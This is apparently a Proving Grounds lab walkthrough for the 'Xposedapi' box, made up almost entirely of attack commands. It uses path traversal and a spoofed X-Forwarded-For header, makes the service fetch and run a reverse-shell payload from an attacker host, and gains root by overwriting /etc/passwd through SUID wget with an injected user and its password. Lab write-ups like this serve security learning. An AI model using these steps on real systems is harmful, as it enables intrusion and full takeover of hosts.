
# Xposedapi - PG Walkthrough

## Initial Foothold

The target exposes an HTTP service on port `13337`. Enumeration and exploitation steps:

### Commands used:
```bash
curl http://192.168.186.134:13337/logs?file=../../../../../etc/passwd -H "X-Forwarded-For: localhost"

curl http://192.168.186.134:13337/update -H "X-Forwarded-For: localhost"

curl -X POST http://192.168.186.134:13337/update \
  -H "X-Forwarded-For: localhost" \
  --data '{"user":"clumsyadmin", "url":"192.168.45.171:22/shell"}'

curl -X POST http://192.168.186.134:13337/update \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: localhost" \
  --data '{"user":"clumsyadmin", "url":"http://192.168.45.171:22/shell"}'

curl -X GET http://192.168.186.134:13337/restart -H "X-Forwarded-For: localhost"
```

Used `msfvenom` to create shell.elf, hosted it on Python web server:
```bash
sudo python3 -m http.server 22
nc -nlvp 4444
```

### Final working exploit sequence:
```bash
curl -X POST http://192.168.186.134:13337/update \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: localhost" \
  --data '{"user":"clumsyadmin", "url":"http://192.168.45.171:22/shell.elf"}'

curl -X POST http://192.168.186.134:13337/restart -H "X-Forwarded-For: localhost"
```

Got shell.

---

## Privilege Escalation

### Found SUID `wget`:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Steps:
1. Create a modified `passwd` file with a root shell user:
```
root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash
```

2. Overwrite `/etc/passwd` using SUID `wget`:
```bash
wget 192.168.45.171:22/passwd -O /etc/passwd
```

3. SSH as `root2`:
```bash
ssh root2@192.168.186.134
# password: w00t
```

---

## Git Upload Commands
```bash
git add Xposedapi.md
git commit -m "Add Xposedapi PG walkthrough with commands"
git push
```
